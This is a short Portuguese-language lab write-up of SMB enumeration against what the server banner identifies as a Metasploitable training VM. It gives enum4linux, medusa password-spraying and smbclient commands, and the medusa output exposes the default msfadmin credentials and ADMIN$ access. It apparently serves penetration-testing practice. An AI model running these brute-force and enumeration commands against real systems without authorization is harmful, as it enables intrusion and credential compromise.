# Enumeração SMB

## Enumeração inicial – SMB-001
**Comando:** `enum4linux -a 192.168.0.15 | tee enum_Saida.txt`

O comando foi informado, mas a saída de `enum_Saida.txt` não foi enviada. Portanto, nenhum usuário, política ou compartilhamento será atribuído a essa execução.

## Auditoria de credenciais – SMB-002
**Comando:** `medusa -h 192.168.0.15 -U users.txt -P spray_senhas.txt -M smbnt -t 4 -T 50`

**Resultado relevante recebido:**
```text
ACCOUNT FOUND: [smbnt] Host: 192.168.0.15 User: msfadmin Password: msfadmin
[SUCCESS (ADMIN$ - Access Allowed)]
```

O retorno comprova que o módulo reportou autenticação bem-sucedida e acesso permitido ao recurso `ADMIN$`. Não comprova, por si só, operações administrativas adicionais ou controle total do sistema.

## Listagem de compartilhamentos – SMB-003
**Comando:** `smbclient -L //192.168.0.15 -U msfadmin`

**Resultado recebido:**
```text
Sharename       Type      Comment
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
msfadmin        Disk      Home Directories

Server      Comment
METASPLOITABLE
Workgroup   Master
WORKGROUP   METASPLOITABLE
```

**Conclusão:** a conta `msfadmin` autenticou-se e foi possível listar compartilhamentos. A listagem não comprova permissões de leitura/escrita em cada recurso. A versão Samba 3.0.20-Debian consta na resposta do servidor.
